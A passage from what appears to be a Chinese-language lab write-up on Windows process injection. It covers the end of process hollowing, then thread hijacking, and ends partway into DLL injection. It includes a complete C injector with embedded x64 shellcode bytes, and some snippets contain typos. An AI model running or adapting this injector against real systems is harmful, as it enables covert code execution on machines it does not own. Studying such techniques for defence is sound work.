#E06C75">hThread</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // 线程句柄</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #56B6C2">&amp;</span><span style="color: #ABB2BF">c</span><span style="color: #7F848E; font-style: italic"> // 指向存储的上下文结构的指针</span></span><span class="line"><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"><span style="color: #61AFEF">ResumeThread</span><span style="color: #ABB2BF">(</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E5C07B">target_pi</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">hThread</span><span style="color: #7F848E; font-style: italic"> // 线程句柄</span></span><span class="line"><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure><p>这样就完成了一个进程空洞注入。</p><h3 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h3><p>靶机里面有一个 demo，这里就不贴代码了。注意要用 32 位环境编译，被注入和注入的程序都要 32 位的，可以自己写一个简单的输入输出模拟一下就 OK 了，我这里是用的一个输出固定字符串的文件来检验我注入是否成功了。</p><figure class="shiki c++"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">#include</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&lt;iostream&gt;</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">main</span><span style="color: #ABB2BF">()</span></span><span class="line"><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">    std::cout </span><span style="color: #C678DD">&lt;&lt;</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;Pwned!</span><span style="color: #56B6C2">\n</span><span style="color: #98C379">&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #61AFEF">system</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;pause&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><h2 id="Thread-Hijacking-线程劫持"><a href="#Thread-Hijacking-线程劫持" class="headerlink" title="Thread Hijacking 线程劫持"></a>Thread Hijacking 线程劫持</h2><p>这里原标题是 Abusing Process Components ，但是实际讲的是线程执行</p><p>线程劫持可分为十个步骤：</p><ol><li>定位并打开要控制的目标进程。</li><li>为恶意代码分配内存区域。</li><li>在分配的内存中编写恶意代码。</li><li>确定要劫持的目标线程的线程 ID。</li><li>打开目标线程。</li><li>暂停目标线程。</li><li>获取线程上下文。</li><li>更新恶意代码的指令指针。</li><li>重写目标线程上下文。</li><li>恢复被劫持的线程。</li></ol><p>这个技术的前三步和之前讲过的是一样的，获取进程句柄，分配内存，写入 shellcode 进内存。</p><figure class="shiki cpp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">HANDLE hProcess </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">OpenProcess</span><span style="color: #ABB2BF">(PROCESS_ALL_ACCESS, FALSE, processId);</span></span><span class="line"><span style="color: #ABB2BF">PVOIF remoteBuffer </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">VirtualAllocEx</span><span style="color: #ABB2BF">(hProcess, </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">, sizeof shellcode, (MEM_RESERVE </span><span style="color: #56B6C2">|</span><span style="color: #ABB2BF"> MEM_COMMIT), PAGE_EXECUTE_READWRITE);</span></span><span class="line"><span style="color: #61AFEF">WriteProcessMemory</span><span style="color: #ABB2BF">(processHandle, remoteBuffer, shellcode, sizeof shellcode, </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure><p>第四步，我们首先使用 <code>CreateToolhelp32Snapshot</code> API 创建一个包含所有线程信息的系统快照。接着，利用 <code>Thread32First</code> 和 <code>Thread32Next</code> 遍历这个快照，找到与目标进程 ID 匹配的线程 ID。找到后，我们使用 <code>OpenThread</code> API 获取这个目标线程的句柄，以便后续操作。</p><ul><li><a href="https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot">CreateToolhelp32Snapshot function</a></li><li><a href="https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-thread32first">Thread32First function</a></li></ul><figure class="shiki cpp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">// 初始化结构体</span></span><span class="line"><span style="color: #ABB2BF">THREADENTRY32 threadEntry;</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">HANDLE hSnapshot </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">CreateToolhelp32Snapshot</span><span style="color: #ABB2BF">(</span></span><span class="line"><span style="color: #ABB2BF">    TH32CS_SNAPTHREAD,</span><span style="color: #7F848E; font-style: italic"> // 快照系统中的所有线程</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #D19A66">0</span><span style="color: #7F848E; font-style: italic">                  // 指示当前进程，不过这里会被忽略，返回的所有的进程的快照</span></span><span class="line"><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">// 获取快照中的第一个线程</span></span><span class="line"><span style="color: #61AFEF">Thread32First</span><span style="color: #ABB2BF">(</span></span><span class="line"><span style="color: #ABB2BF">    hSnapshot,</span><span style="color: #7F848E; font-style: italic">   // 快照的句柄</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #56B6C2">&amp;</span><span style="color: #ABB2BF">threadEntry</span><span style="color: #7F848E; font-style: italic"> // 指向 THREADENTRY32 的结构体指针</span></span><span class="line"><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">do</span><span style="color: #ABB2BF"> {</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #E5C07B">threadEntry</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">th32OwnerProcessID</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">==</span><span style="color: #ABB2BF"> processID)</span><span style="color: #7F848E; font-style: italic"> // 匹配进程 ID</span></span><span class="line"><span style="color: #ABB2BF">    {</span></span><span class="line"><span style="color: #7F848E; font-style: italic">        // 打开找到进程的线程的句柄</span></span><span class="line"><span style="color: #ABB2BF">        HANDLE hThread </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">OpenThread</span><span style="color: #ABB2BF">(THREAD_ALL_ACCESS, FALSE, </span><span style="color: #E5C07B">threadEntry</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">th32ThreadID</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">break</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #ABB2BF">} </span><span style="color: #C678DD">while</span><span style="color: #ABB2BF"> (</span><span style="color: #61AFEF">Thread32Next</span><span style="color: #ABB2BF">(hsnapshot, </span><span style="color: #56B6C2">&amp;</span><span style="color: #ABB2BF">threadEntry));</span></span></code></pre></div></div></figure><p>第六步，挂起线程。接着，我们使用 <code>GetThreadContext</code> 获取线程的上下文。在 <code>CONTEXT</code> 结构体中，我们找到并修改<strong>指令指针寄存器</strong>（在 x64 系统上为 <code>RIP</code>，在 x86 系统上为 <code>EIP</code>），让它指向我们之前注入的 <code>shellcode</code> 的内存地址。最后，用 <code>SetThreadContext</code> 将修改后的上下文写回线程。最后一步让程序继续运行就 OK 了。</p><figure class="shiki cpp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">// 挂起线程</span></span><span class="line"><span style="color: #61AFEF">SuspendThread</span><span style="color: #ABB2BF">(hThread);</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">// 定义一个 CONTEXT 结构体</span></span><span class="line"><span style="color: #ABB2BF">CONTEXT context;</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">// 获取线程上下文</span></span><span class="line"><span style="color: #61AFEF">GetThreadContext</span><span style="color: #ABB2BF">(hThread, </span><span style="color: #56B6C2">&amp;</span><span style="color: #ABB2BF">context);</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">// 修改 CONTEXT 结构体变量让 RIP 指向我们分配并且写入好的内存区域</span></span><span class="line"><span style="color: #E5C07B">context</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">Rip</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> (DWORD_PTR)remoteBuffer; </span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">// 设置线程的上下文</span></span><span class="line"><span style="color: #61AFEF">SetThreadContext</span><span style="color: #ABB2BF">(hThread,</span><span style="color: #56B6C2">&amp;</span><span style="color: #ABB2BF">context);</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// 让线程继续运行</span></span><span class="line"><span style="color: #61AFEF">ResumeThread</span><span style="color: #ABB2BF">(hThread);</span></span></code></pre></div></div></figure><h3 id="实战-1"><a href="#实战-1" class="headerlink" title="实战"></a>实战</h3><p>这个给的 Demo 就是修改 RIP 的，所以直接劫持 x64 应用就 OK。当然 shellcode 也要换一下，下面是我改好的代码。</p><figure class="shiki c"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">#include</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&lt;windows.h&gt;</span></span><span class="line"><span style="color: #C678DD">#include</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&lt;dbghelp.h&gt;</span></span><span class="line"><span style="color: #C678DD">#include</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&lt;tlhelp32.h&gt;</span></span><span class="line"><span style="color: #C678DD">#include</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&lt;stdio.h&gt;</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">unsigned</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">char</span><span style="color: #ABB2BF"> shellcode</span><span style="color: #C678DD">[]</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">=</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\x48\x31\xc9\x48\x81\xe9\xde\xff\xff\xff\x48\x8d\x05\xef</span><span style="color: #98C379">&quot;</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\xff\xff\xff\x48\xbb\x53\x60\x16\x71\x23\x14\xed\xcc\x48</span><span style="color: #98C379">&quot;</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xaf\x28\x95</span><span style="color: #98C379">&quot;</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\x95\xd3\xfc\x2d\xcc\x53\x60\x57\x20\x62\x44\xbf\x9d\x05</span><span style="color: #98C379">&quot;</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\x28\x27\xa3\x46\x5c\x66\x9e\x33\x28\x9d\x23\x3b\x5c\x66</span><span style="color: #98C379">&quot;</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\x9e\x73\x28\x9d\x03\x73\x5c\xe2\x7b\x19\x2a\x5b\x40\xea</span><span style="color: #98C379">&quot;</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\x5c\xdc\x0c\xff\x5c\x77\x0d\x21\x38\xcd\x8d\x92\xa9\x1b</span><span style="color: #98C379">&quot;</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\x30\x22\xd5\x0f\x21\x01\x21\x47\x39\xa8\x46\xcd\x47\x11</span><span style="color: #98C379">&quot;</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\x5c\x5e\x70\xf3\x9f\x6d\x44\x53\x60\x16\x39\xa6\xd4\x99</span><span style="color: #98C379">&quot;</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\xab\x1b\x61\xc6\x21\xa8\x5c\xf5\x88\xd8\x20\x36\x38\x22</span><span style="color: #98C379">&quot;</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\xc4\x0e\x9a\x1b\x9f\xdf\x30\xa8\x20\x65\x84\x52\xb6\x5b</span><span style="color: #98C379">&quot;</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\x40\xea\x5c\xdc\x0c\xff\x21\xd7\xb8\x2e\x55\xec\x0d\x6b</span><span style="color: #98C379">&quot;</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\x80\x63\x80\x6f\x17\xa1\xe8\x5b\x25\x2f\xa0\x56\xcc\xb5</span><span style="color: #98C379">&quot;</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\x88\xd8\x20\x32\x38\x22\xc4\x8b\x8d\xd8\x6c\x5e\x35\xa8</span><span style="color: #98C379">&quot;</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\x54\xf1\x85\x52\xb0\x57\xfa\x27\x9c\xa5\xcd\x83\x21\x4e</span><span style="color: #98C379">&quot;</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\x30\x7b\x4a\xb4\x96\x12\x38\x57\x28\x62\x4e\xa5\x4f\xbf</span><span style="color: #98C379">&quot;</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\x40\x57\x23\xdc\xf4\xb5\x8d\x0a\x3a\x5e\xfa\x31\xfd\xba</span><span style="color: #98C379">&quot;</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\x33\xac\x9f\x4b\x39\x99\x15\xed\xcc\x53\x60\x16\x71\x23</span><span style="color: #98C379">&quot;</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\x5c\x60\x41\x52\x61\x16\x71\x62\xae\xdc\x47\x3c\xe7\xe9</span><span style="color: #98C379">&quot;</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\xa4\x98\xe4\x58\x6e\x05\x21\xac\xd7\xb6\xa9\x70\x33\x86</span><span style="color: #98C379">&quot;</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\x28\x95\xb5\x0b\x28\xeb\xb0\x59\xe0\xed\x91\x56\x11\x56</span><span style="color: #98C379">&quot;</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\x8b\x40\x12\x79\x1b\x23\x4d\xac\x45\x89\x9f\xc3\x12\x42</span><span style="color: #98C379">&quot;</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\x78\x8e\xcc</span><span style="color: #98C379">&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">main</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">int</span><span style="color: #E06C75"> </span><span style="color: #E06C75; font-style: italic">argc</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #C678DD">char</span><span style="color: #E06C75"> </span><span style="color: #C678DD">*</span><span style="color: #E06C75; font-style: italic">argv</span><span style="color: #C678DD">[]</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">    HANDLE h_thread </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">    THREADENTRY32 threadEntry;</span></span><span class="line"><span style="color: #ABB2BF">    CONTEXT context;</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E5C07B">context</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">ContextFlags</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> CONTEXT_FULL;</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E5C07B">threadEntry</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">dwSize</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">sizeof</span><span style="color: #ABB2BF">(THREADENTRY32);</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">    HANDLE h_process </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">OpenProcess</span><span style="color: #ABB2BF">(PROCESS_ALL_ACCESS, </span><span style="color: #D19A66">FALSE</span><span style="color: #ABB2BF">, (</span><span style="color: #61AFEF">atoi</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">argv</span><span style="color: #ABB2BF">[</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">])));</span></span><span class="line"><span style="color: #ABB2BF">    PVOID b_shellcode </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">VirtualAllocEx</span><span style="color: #ABB2BF">(h_process, </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">sizeof</span><span style="color: #ABB2BF"> shellcode, (MEM_RESERVE </span><span style="color: #C678DD">|</span><span style="color: #ABB2BF"> MEM_COMMIT), PAGE_EXECUTE_READWRITE);</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #61AFEF">WriteProcessMemory</span><span style="color: #ABB2BF">(h_process, b_shellcode, shellcode, </span><span style="color: #C678DD">sizeof</span><span style="color: #ABB2BF"> shellcode, </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">    HANDLE h_snapshot </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">CreateToolhelp32Snapshot</span><span style="color: #ABB2BF">(TH32CS_SNAPTHREAD, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #61AFEF">Thread32First</span><span style="color: #ABB2BF">(h_snapshot, </span><span style="color: #C678DD">&amp;</span><span style="color: #ABB2BF">threadEntry);</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">do</span></span><span class="line"><span style="color: #ABB2BF">    {</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #E5C07B">threadEntry</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">th32OwnerProcessID</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">==</span><span style="color: #ABB2BF"> (</span><span style="color: #61AFEF">atoi</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">argv</span><span style="color: #ABB2BF">[</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">])))</span></span><span class="line"><span style="color: #ABB2BF">        {</span></span><span class="line"><span style="color: #ABB2BF">            h_thread </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">OpenThread</span><span style="color: #ABB2BF">(THREAD_ALL_ACCESS, </span><span style="color: #D19A66">FALSE</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">threadEntry</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">th32ThreadID</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">            </span><span style="color: #C678DD">break</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">        }</span></span><span class="line"><span style="color: #ABB2BF">    } </span><span style="color: #C678DD">while</span><span style="color: #ABB2BF"> (</span><span style="color: #61AFEF">Thread32Next</span><span style="color: #ABB2BF">(h_snapshot, </span><span style="color: #C678DD">&amp;</span><span style="color: #ABB2BF">threadEntry));</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (h_thread)</span></span><span class="line"><span style="color: #ABB2BF">    {</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">SuspendThread</span><span style="color: #ABB2BF">(h_thread);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">GetThreadContext</span><span style="color: #ABB2BF">(h_thread, </span><span style="color: #C678DD">&amp;</span><span style="color: #ABB2BF">context);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">context</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">Rip</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> (DWORD_PTR)b_shellcode;</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">SetThreadContext</span><span style="color: #ABB2BF">(h_thread, </span><span style="color: #C678DD">&amp;</span><span style="color: #ABB2BF">context);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">ResumeThread</span><span style="color: #ABB2BF">(h_thread);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">printf</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Inject Success!</span><span style="color: #56B6C2">\n</span><span style="color: #98C379">&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">else</span></span><span class="line"><span style="color: #ABB2BF">    {</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">printf</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Thread Not Found!</span><span style="color: #56B6C2">\n</span><span style="color: #98C379">&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><h2 id="Abusing-DLLs-滥用-DLL"><a href="#Abusing-DLLs-滥用-DLL" class="headerlink" title="Abusing DLLs 滥用 DLL"></a>Abusing DLLs 滥用 DLL</h2><p>DLL 注入可以分为6个步骤：</p><ol><li>找到要注入的目标进程。</li><li>打开目标进程。</li><li>为恶意 DLL 分配内存区域。</li><li>将恶意 DLL 写入分配的内存。</li><li>加载并执行恶意 DLL。</li></ol><p>在 DLL 注入的第一步，我们必须找到一个目标线程。可以使用三个 Windows API 调用从进程中找到一个线程：<code>CreateToolhelp32Snapshot()</code> 、 <code>Process32First()</code> 和 <code>Process32Next()</code>，这个和上一节中是一样的，不过是通过遍历线程了。<code>Thread32</code> 和 <code>Process32</code> 的区别。</p><figure class="shiki cpp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E5C07B">DWORD</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">getProcessId</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">const</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">char</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">*</span><span style="color: #E06C75; font-style: italic">processName</span><span style="color: #ABB2BF">){</span></span><span class="line"><span style="color: #7F848E; font-style: italic">    // 打快照</span></span><span class="line"><span style="color: #ABB2BF">    HANDLE hSnapshot </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">CreateToolhelp32Snapshot</span><span style="color: #ABB2BF">(</span></span><span class="line"><span style="color: #ABB2BF">        TH32CS_SNAPPROCESS,</span><span style="color: #7F848E; font-style: italic"> // 快照系统中的所有线程</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">    </span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (hSnapshot){</span></span><span class="line"><span style="color: #ABB2BF">        PROCESSENTRY32 entry;</span><span style="color: #7F848E; font-style: italic">                  // 创建 PROCESSENTRY32 结构体指针</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">entry</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">dwSize</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">sizeof</span><span style="color: #ABB2BF">(PROCESSENTRY32);</span><span style="color: #7F848E; font-style: italic"> // 预先设置结构体的大小</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #61AFEF">Process32First</span><span style="color: #ABB2BF">(hSnapshot, </span><span style="color: #56B6C2">&amp;</span><span style="color: #ABB2BF">entry)){</span></span><span class="line"><span style="color: #ABB2BF">            </span><span style="color: #C678DD">do</span><span style="color: #ABB2BF"> {</span></span><span class="line"><span style="color: #7F848E; font-style: italic">                // 从结构体指针里面取出进程名和提供的进程名进行比对</span></span><span class="line"><span style="color: #ABB2BF">                </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #56B6C2">!</span><span style="color: #61AFEF">strcmp</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">entry</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">szExeFile</span><span style="color: #ABB2BF">, processName)){</span></span><span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: 